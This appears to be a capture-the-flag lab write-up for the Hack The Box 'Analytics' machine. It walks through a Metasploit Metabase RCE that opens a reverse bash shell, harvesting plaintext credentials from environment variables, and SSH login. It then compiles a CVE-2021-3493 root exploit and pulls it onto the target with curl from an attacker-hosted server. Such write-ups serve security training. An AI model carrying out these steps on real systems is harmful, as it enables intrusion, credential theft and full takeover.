## Nmap Scan

I do a `nmap scan`:
```sh
┌──(kali㉿kali)-[~]
└─$ nmap -sV -sC -A 10.10.11.233
Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-29 13:07 EDT
Nmap scan report for 10.10.11.233
Host is up (0.12s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://analytical.htb/
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
``` 

I edit this file `/etc/hosts` in this way:
```sh
┌──(kali㉿kali)-[~]
└─$ sudo nano /etc/hosts                       
[sudo] password for kali: 

┌──(kali㉿kali)-[~]
└─$ cat /etc/hosts
127.0.0.1       localhost
127.0.1.1       kali
::1             localhost ip6-localhost ip6-loopback
ff02::1         ip6-allnodes
ff02::2         ip6-allrouters
10.10.11.233    analytical.htb
```

## Foothold

I visit this site `http://analytical.htb/`, I click the login button, and I discover a subdomain `data.analytical.htb`:
I edit another time this file `/etc/hosts` in this way:
```sh
┌──(kali㉿kali)-[~]
└─$ sudo nano /etc/hosts                       
[sudo] password for kali: 

┌──(kali㉿kali)-[~]
└─$ cat /etc/hosts
127.0.0.1       localhost
127.0.1.1       kali
::1             localhost ip6-localhost ip6-loopback
ff02::1         ip6-allnodes
ff02::2         ip6-allrouters
10.10.11.233    analytical.htb
10.10.11.233    data.analytical.htb
```

Now I visit this site `http://data.analytical.htb/`, and I discover that the login page use `Metabase`

I search the exploit on metasploit, I find it:
```sh
msf6 > search metabase

Matching Modules
================

   #  Name                                         Disclosure Date  Rank       Check  Description
   -  ----                                         ---------------  ----       -----  -----------
   0  exploit/linux/http/metabase_setup_token_rce  2023-07-22       excellent  Yes    Metabase Setup Token RCE


Interact with a module by name or index. For example info 0, use 0 or use exploit/linux/http/metabase_setup_token_rce

msf6 > use 0
[*] Using configured payload cmd/unix/reverse_bash
msf6 exploit(linux/http/metabase_setup_token_rce) > 
```

I set all options and I run the exploit:
```sh
msf6 exploit(linux/http/metabase_setup_token_rce) > set rhosts data.analytical.htb
rhosts => data.analytical.htb
msf6 exploit(linux/http/metabase_setup_token_rce) > set rport 80
rport => 80
msf6 exploit(linux/http/metabase_setup_token_rce) > set lhost 10.10.14.62
lhost => 10.10.14.62
msf6 exploit(linux/http/metabase_setup_token_rce) > run

[*] Started reverse TCP handler on 10.10.14.62:4444 
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target appears to be vulnerable. Version Detected: 0.46.6
[+] Found setup token: 249fa03d-fd94-4d5b-b94f-b4ebf3df681f
[*] Sending exploit (may take a few seconds)
[*] Command shell session 1 opened (10.10.14.62:4444 -> 10.10.11.233:59330) at 2023-10-29 13:51:13 -0400

/bin/bash -i
bash: cannot set terminal process group (1): Not a tty
bash: no job control in this shell
d63a81c2c1f7:/$ 
```

I see the `variables environment` and I discover the password:
```sh
d63a81c2c1f7:/$ env
env
SHELL=/bin/sh
MB_DB_PASS=
HOSTNAME=d63a81c2c1f7
LANGUAGE=en_US:en
MB_JETTY_HOST=0.0.0.0
JAVA_HOME=/opt/java/openjdk
MB_DB_FILE=//metabase.db/metabase.db
PWD=/
LOGNAME=metabase
MB_EMAIL_SMTP_USERNAME=
HOME=/home/metabase
LANG=en_US.UTF-8
META_USER=metalytics
META_PASS=An4lytics_ds20223#
MB_EMAIL_SMTP_PASSWORD=
USER=metabase
SHLVL=6
MB_DB_USER=
FC_LANG=en-US
LD_LIBRARY_PATH=/opt/java/openjdk/lib/server:/opt/java/openjdk/lib:/opt/java/openjdk/../lib
LC_CTYPE=en_US.UTF-8
MB_LDAP_BIND_DN=
LC_ALL=en_US.UTF-8
MB_LDAP_PASSWORD=
PATH=/opt/java/openjdk/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
MB_DB_CONNECTION_URI=
JAVA_VERSION=jdk-11.0.19+7
_=/usr/bin/env
```

Credentials:
```
- Username: metalytics
- Password: An4lytics_ds20223#
```

I do the login to ssh and I take the `user flag`:
```sh
┌──(kali㉿kali)-[~]
└─$ ssh metalytics@10.10.11.233
The authenticity of host '10.10.11.233 (10.10.11.233)' can't be established.
ED25519 key fingerprint is SHA256:TgNhCKF6jUX7MG8TC01/MUj/+u0EBasUVsdSQMHdyfY.
This host key is known by the following other names/addresses:
    ~/.ssh/known_hosts:17: [hashed name]
    ~/.ssh/known_hosts:20: [hashed name]
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.11.233' (ED25519) to the list of known hosts.
metalytics@10.10.11.233's password: 
Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 6.2.0-25-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sun Oct 29 05:55:27 PM UTC 2023

  System load:              0.77197265625
  Usage of /:               97.3% of 7.78GB
  Memory usage:             35%
  Swap usage:               0%
  Processes:                217
  Users logged in:          0
  IPv4 address for docker0: 172.17.0.1
  IPv4 address for eth0:    10.10.11.233
  IPv6 address for eth0:    dead:beef::250:56ff:feb9:8d9a

  => / is using 97.3% of 7.78GB
  => There are 49 zombie processes.


Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Sun Oct 29 15:52:28 2023 from 10.10.14.79
metalytics@analytics:~$ cat user.txt
b2a796af6b52daaf54af15debcd70176
```


## Privilege Escalation

I see the operating system release:
```sh
metalytics@analytics:~$ cat /etc/os-release
PRETTY_NAME="Ubuntu 22.04.3 LTS"
NAME="Ubuntu"
VERSION_ID="22.04"
VERSION="22.04.3 LTS (Jammy Jellyfish)"
VERSION_CODENAME=jammy
ID=ubuntu
ID_LIKE=debian
HOME_URL="https://www.ubuntu.com/"
SUPPORT_URL="https://help.ubuntu.com/"
BUG_REPORT_URL="https://bugs.launchpad.net/ubuntu/"
PRIVACY_POLICY_URL="https://www.ubuntu.com/legal/terms-and-policies/privacy-policy"
UBUNTU_CODENAME=jammy
```

I discover that it is vulnerable to `CVE-2021-3493`, thereby I take a exploit on github `https://github.com/briskets/CVE-2021-3493`, I copy the exploit, and I compile it:
```sh
┌──(kali㉿kali)-[~/Analytics]
└─$ nano exploit.c              
┌──(kali㉿kali)-[~/Analytics]
└─$ gcc exploit.c -o exploit
```

Then I transfer the file:
- I open a Web Server in the Local Machine:
```sh
┌──(kali㉿kali)-[~/Analytics]
└─$ python3 -m http.server 4444 
Serving HTTP on 0.0.0.0 port 4444 (http://0.0.0.0:4444/) ...
```

- I download the file in the Target Machine:
```sh
metalytics@analytics:~$ curl http://10.10.14.114:4444/exploit -O exploit
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100 17208  100 17208    0     0  46071      0 --:--:-- --:--:-- --:--:-- 46010
curl: (6) Could not resolve host: exploit
```

I execute the exploit:
```sh
metalytics@analytics:~$ chmod +x exploit
metalytics@analytics:~$ ./exploit
bash-5.1# whoami
root
bash-5.1# 
```

I take the `root flag`:
```
bash-5.1# cat /root/root.txt
4c1109c0ab06b30a498b7438c7c9fd5b
```